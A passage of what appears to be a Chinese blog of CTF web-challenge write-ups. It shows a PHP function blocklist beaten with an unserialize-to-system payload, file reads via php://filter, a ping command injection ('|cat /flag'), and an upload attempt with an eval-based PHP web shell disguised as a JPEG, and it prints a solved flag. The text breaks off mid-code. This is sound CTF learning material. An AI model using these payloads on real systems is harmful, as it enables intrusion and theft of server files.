class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br>&lt;/p&gt;<br>&lt;form  id=form1 name=form1 action=<span class="hljs-string">&quot;index.php&quot;</span> method=post&gt;<br>    &lt;input type=hidden id=func name=func value=<span class="hljs-string">&#x27;date&#x27;</span>&gt;<br>    &lt;input type=hidden id=p name=p value=<span class="hljs-string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>可以看到过滤了一堆函数  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span><br></code></pre></td></tr></table></figure><p>好像没有file_get_contents() ?</p><p>func&#x3D;file_get_contents;highlight_file&amp;p&#x3D;flag<br>&#x2F;&#x2F;不行</p><p>func&#x3D;file_get_contents&amp;p&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p><p>Warning: file_get_contents(&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.php): failed to open stream: No such file or directory in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 24</p><p>不行，看wp说要用反序列化，仔细看一眼源码<br>有个function __destruct()<br>改不会是这个？  </p><p>可这里也没有unserialize 啊<br>为什么是用反序列化？</p><p>原来func就直接传unserialize啊<br>对哦，它也是php的一个函数    </p><p>直接传</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure><p>然后_destruct 就能触发了  </p><p>就能找到flag位置了</p><h1 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h1><p>给一个获取网页快照的功能<br>那不用猜就是有curl函数<br>扫一下目录没扫出东西  </p><p>抓包得到</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node7.anna.nssctf.cn:29484<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>26<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node7.anna.nssctf.cn:29484<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node7.anna.nssctf.cn:29484/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-mel">url=<span class="hljs-keyword">file</span>%3A%2F%2Findex.php</span><br></code></pre></td></tr></table></figure><p>f12 源码也没有功能源码  </p><p>输入file:&#x2F;&#x2F;&#x2F;flag<br>提示：<br>都说了这里看不了flag。。但是可以看看提示文件：&#x2F;fl4g  </p><p>file:&#x2F;&#x2F;&#x2F;fl4g  </p><p>你应该看看除了index.php，是不是还有个ha1x1ux1u.php  </p><p>file:&#x2F;&#x2F;&#x2F;ha1x1ux1u.php<br>不行</p><p>在url里直接访问ha1x1ux1u.php<br>得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;file&quot;</span>))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你败了.&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//flag in /flag</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>不能用file:&#x2F;&#x2F;<br>但是竟然有file_get_contents()那就能用php伪协议  </p><p>直接传入：<br><a href="http://node7.anna.nssctf.cn:29484/ha1x1ux1u.php?file=/flag">http://node7.anna.nssctf.cn:29484/ha1x1ux1u.php?file=/flag</a>    </p><p>就拿到了flag?不用伪协议？</p><p>测试了一下，用php伪协议也可以：<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag<br>回显:<br>TlNTQ1RGezg4YmE0NWNjLTJlYTEtNGRiNS04MzY1LWMzOTA0MDFiNmQ5N30K</p><p>解码就是flag  </p><h1 id="LitCTF-2023-导弹迷踪"><a href="#LitCTF-2023-导弹迷踪" class="headerlink" title="[LitCTF 2023]导弹迷踪"></a>[LitCTF 2023]导弹迷踪</h1><p>老规矩，只玩一遍<br>f12 找到flag<br>flag字样被改为<br>F|L|A|G<br>直接搜搜不到的  </p><h1 id="NCTF-2018-签到题"><a href="#NCTF-2018-签到题" class="headerlink" title="[NCTF 2018] 签到题"></a>[NCTF 2018] 签到题</h1><p>找了半小时，cookie和请求头里面分别有两个假的flag  </p><p>真flag在源访问链接<br>即&#x2F;index.php的访问标头里  </p><h1 id="NSSCTF-2022-Spring-Recruit-ezgame"><a href="#NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="[NSSCTF 2022 Spring Recruit]ezgame"></a>[NSSCTF 2022 Spring Recruit]ezgame</h1><p>f12 直接找<br>或者修改前端都行  </p><h1 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h1><p>尝试一下ping我的blog，提示只能ping ip地址  </p><p>试了一下ping 我的服务ip 和 127.0.0.0<br>都是百分百丢包率  </p><p>不管了，抓包看看  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node5.anna.nssctf.cn:29540<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>27<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node5.anna.nssctf.cn:29540<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node5.anna.nssctf.cn:29540/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-autoit">command=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>&amp;<span class="hljs-built_in">ping</span>=<span class="hljs-built_in">ping</span></span><br></code></pre></td></tr></table></figure><p>改一下看看  </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">command</span>=/&amp;ping=<span class="hljs-keyword">ls</span><br><br>没回显<br><br><span class="hljs-keyword">command</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span>|<span class="hljs-keyword">ls</span>&amp;ping=ping<br><br>/回显：<br><span class="hljs-built_in">index</span>.php<br>upload<br></code></pre></td></tr></table></figure><p>试了一下upload目录403  </p><p>那直接看根目录</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">command</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span>|<span class="hljs-keyword">ls</span> /&amp;ping=ping<br><br>回显：<br>bin<span class="hljs-symbol">&lt;br&gt;</span><br>dev<span class="hljs-symbol">&lt;br&gt;</span><br>etc<span class="hljs-symbol">&lt;br&gt;</span><br>flag<span class="hljs-symbol">&lt;br&gt;</span><br>home<span class="hljs-symbol">&lt;br&gt;</span><br>lib<span class="hljs-symbol">&lt;br&gt;</span><br>media<span class="hljs-symbol">&lt;br&gt;</span><br>mnt<span class="hljs-symbol">&lt;br&gt;</span><br><span class="hljs-keyword">opt</span><span class="hljs-symbol">&lt;br&gt;</span><br>proc<span class="hljs-symbol">&lt;br&gt;</span><br>root<span class="hljs-symbol">&lt;br&gt;</span><br>run<span class="hljs-symbol">&lt;br&gt;</span><br>sbin<span class="hljs-symbol">&lt;br&gt;</span><br>srv<span class="hljs-symbol">&lt;br&gt;</span><br>sys<span class="hljs-symbol">&lt;br&gt;</span><br>tmp<span class="hljs-symbol">&lt;br&gt;</span><br>usr<span class="hljs-symbol">&lt;br&gt;</span><br>var<span class="hljs-symbol">&lt;br&gt;</span><br></code></pre></td></tr></table></figure><p>那接下来cat &#x2F;flag就行  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">command</span>=127.0.0.0|cat /flag&amp;<span class="hljs-attribute">ping</span>=ping<br></code></pre></td></tr></table></figure><p>拿到flag</p><h1 id="TGCTF-ezupload"><a href="#TGCTF-ezupload" class="headerlink" title="TGCTF ezupload"></a>TGCTF ezupload</h1><p>先上传一个正常的jpg   </p><p>回显  </p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">&#123;<span class="hljs-string">&quot;status_code&quot;</span>:<span class="hljs-number">403</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>7981<span class="hljs-char escape_">\u</span>6b62<span class="hljs-char escape_">\u</span>4fdd<span class="hljs-char escape_">\u</span>5b58<span class="hljs-char escape_">\u</span>4e3a<span class="hljs-char escape_">\u</span>8be5<span class="hljs-char escape_">\u</span>7c7b<span class="hljs-char escape_">\u</span>578b<span class="hljs-char escape_">\u</span>6587<span class="hljs-char escape_">\u</span>4ef6<span class="hljs-char escape_">\u</span>ff01&quot;</span>&#125;<br><br>unicode解码后的意思就是<br><br>文件内容包含非法字符，禁止上传！<br><br>我不明白  <br></code></pre></td></tr></table></figure><p>抓包传马看看：  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:62381<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>355<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary5Frc88R0NhJL8adt<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary5Frc88R0NhJL8adt</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;name&quot;; filename=&quot;shell.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: aimage/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[zhong]);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary5Frc88R0NhJL8adt</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">上传文件</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary5Frc88R0NhJL8adt--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><p>还是不行   </p><p>扫一下目录<br>看到有index.php.bak  </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[17:07:56]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">419</span>B  - /index<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[17:07:57]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">419</span>B  - /index<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.bak</span><br><span class="hljs-selector-attr">[17:10:56]</span> <span class="hljs-number">200</span> -   <span class="hljs-number">30</span>B  - /upload<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[17:10:57]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /uploads  -&gt;  http:<span class="hljs-comment">//127.0.0.1/uploads/</span><br><span class="hljs-selector-attr">[17:10:57]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /uploads/<br></code></pre></td></tr></table></figure><p>访问一下uploads&#x2F;,403,顺便知道了服务端是nginx<br>那猜测一下会有upload.php.bak<br>给我猜对了   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UPLOAD_PATH&#x27;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/uploads/&#x27;</span>);<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$status_code</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// 默认状态码为 200</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;php2&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$temp_file</span>);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?&lt;/s&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件内容包含非法字符，禁止上传！&#x27;</span>;<br>                <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 